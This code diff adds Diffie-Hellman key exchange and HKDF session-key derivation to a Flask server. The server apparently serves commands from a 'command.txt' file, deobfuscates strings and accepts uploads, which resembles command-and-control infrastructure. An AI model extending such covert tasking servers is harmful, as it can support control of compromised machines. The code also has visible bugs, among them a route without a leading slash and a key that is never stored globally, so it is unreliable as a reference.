@@ -4,6 +4,9 @@ import json
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import padding
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.asymmetric import dh
+from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 import os
 import base64
 import hashlib
@@ -11,6 +14,15 @@ import hashlib
 BLOCK_SIZE = 16
 # KEY = "your_secret_key_here"  # Replace with your actual key
 key_path = "./key.txt"
+server_derived_key = None
+
+
+def generate_params():
+    parameters = dh.generate_parameters(generator=2, key_size=2048, backend=default_backend())
+    private_key = parameters.generate_private_key()
+    public_key = private_key.public_key()
+
+    return parameters, private_key, public_key
 
 def generate_key():
     key = os.urandom(BLOCK_SIZE)
@@ -86,6 +98,47 @@ def deobfuscate(obf_str):
 
 app = Flask(__name__)
 COMMAND_FILE = "command.txt"
+
+parameters, private_key, public_key = generate_params()
+
+server_public_bytes = public_key.public_bytes(
+    encoding=serialization.Encoding.PEM,
+    format=serialization.PublicFormat.SubjectPublicKeyInfo
+)
+
+### KEY EXCHANGE RELATED STUFF
+
+@app.route("/get_key_params", methods=["GET"])
+def get_key_params():
+    ## Agree on paramaeters for key sharing
+    byte_sized_params = parameters.parameter_bytes(
+        encoding=serialization.Encoding.PEM,
+        format=serialization.ParameterFormat.PKCS3
+    )
+    return byte_sized_params
+
+@app.route("xchg_secrets", methods=["POST"])
+def xchg_secrets():
+    ## Request client public key to derive server_key for session
+    client_public_bytes = request.data
+    client_public_key = serialization.load_pem_public_key(
+        client_public_bytes,
+        backend=default_backend()
+    )
+
+    ## Compute and store server_derived_key for commands
+    shared_secret = private_key.exchange(client_public_key)
+    server_derived_key =  HKDF(
+        algorithm=hashes.SHA256(),
+        length=32,
+        salt=None,
+        info=b'KEYAES',
+    ).derive(shared_secret)
+
+    return server_public_bytes
+
+## KEY EXCHANGE RELATED STUFF
+
 
 @app.route('/upload', methods=['POST'])
 def upload():
